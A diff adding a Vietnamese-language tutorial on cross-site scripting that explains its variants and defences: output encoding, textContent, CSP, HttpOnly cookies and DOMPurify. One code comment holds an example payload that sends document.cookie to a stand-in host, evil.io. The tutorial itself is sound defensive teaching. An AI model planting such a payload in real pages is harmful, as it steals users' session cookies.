@@ -1,0 +1,42 @@
+XSS (Cross-Site Scripting) là lỗ hổng nghiêm trọng phổ biến nhất của web: văn bản do kẻ tấn công cung cấp được render thành _code_ trong trình duyệt của người dùng khác.
+
+## Nó xảy ra thế nào
+
+```js
+// Tính năng bình luận render HTML thô:
+commentList.innerHTML = `<div>${comment.text}</div>`;
+// comment.text = "<img src=x onerror='fetch("//evil.io?c="+document.cookie)'>"
+```
+
+Trình duyệt không phân biệt được markup của bạn với markup của kẻ tấn công — cả hai đều đến dạng HTML. Ba biến thể:
+
+- **Stored XSS** — payload được lưu (vào DB) và phục vụ cho mọi người xem. Nguy hiểm nhất.
+- **Reflected XSS** — payload đến từ request (query string), được render trong response. Cần nạn nhân bấm một đường link được chế.
+- **DOM-based XSS** — JS phía client tự chèn dữ liệu không an toàn vào DOM (`innerHTML`, `document.write`, `eval`).
+
+## Cách sửa: mã hóa output theo ngữ cảnh
+
+Dữ liệu chỉ nguy hiểm khi nó _đi vào code_. Mã hóa theo từng ngữ cảnh đích:
+
+- **Thân HTML**: `&lt;` `&gt;` `&amp;` — dùng `textContent`, không bao giờ `innerHTML`, cho dữ liệu
+- **Attribute HTML**: đặt attribute trong ngoặc và escape `"`
+- **Chuỗi JavaScript**: tránh nhúng dữ liệu vào script inline hoàn toàn
+- **URL**: `encodeURIComponent` cho giá trị query (URL `javascript:` cũng là một vector XSS)
+
+```js
+// AN TOÀN: textContent coi dữ liệu là dữ liệu
+const div = document.createElement("div");
+div.textContent = comment.text;
+```
+
+React/Vue/Svelte escape mặc định — vì thế các bug XSS còn lại tập trung ở `dangerouslySetInnerHTML`, bộ render markdown, và các attribute sink. Bảo mật hiện đại là biết những cửa thoát hiểm nằm ở đâu.
+
+## Phòng thủ theo chiều sâu
+
+- **Header CSP (Content-Security-Policy)**: kể cả khi payload lọt vào, CSP có thể chặn chạy script inline. `Content-Security-Policy: default-src 'self'` là mặc định mạnh.
+- **Cookie HttpOnly**: token phiên mà JavaScript không đọc được — payload bị đánh cắp không lấy được chúng.
+- **Bộ làm sạch** (DOMPurify) cho những trường hợp thực sự cần HTML đầu vào: cho phép danh sách tag, loại bỏ event handler.
+
+## Xác minh an toàn
+
+Trong bài tập, ta test bằng chuông canary: `<img src=x onerror=...>` kết thúc dưới dạng _văn bản_ (tốt) hay thành một phần tử có attribute `onerror` (xấu)? Parse output đã render của chính mình trong một trang đồ chơi có kiểm soát là an toàn và kết luận dứt khoát.
